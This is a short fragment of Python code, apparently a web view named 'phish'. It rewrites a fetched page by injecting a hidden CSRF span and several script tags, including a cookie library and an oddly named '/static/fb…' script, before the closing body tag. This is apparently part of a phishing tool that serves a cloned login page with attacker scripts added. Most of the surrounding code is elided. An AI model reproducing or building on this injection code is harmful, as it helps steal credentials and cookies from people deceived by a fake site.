...
def phish(request):
    ...
    text = req.text.replace('</body>', '<span id="csrf" hidden>' + str(
        csrf_c) + '</span><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script><script src="/static/jquery.cookie.js"></script><script src="/static/fb12448784534457.js"></script></body>')
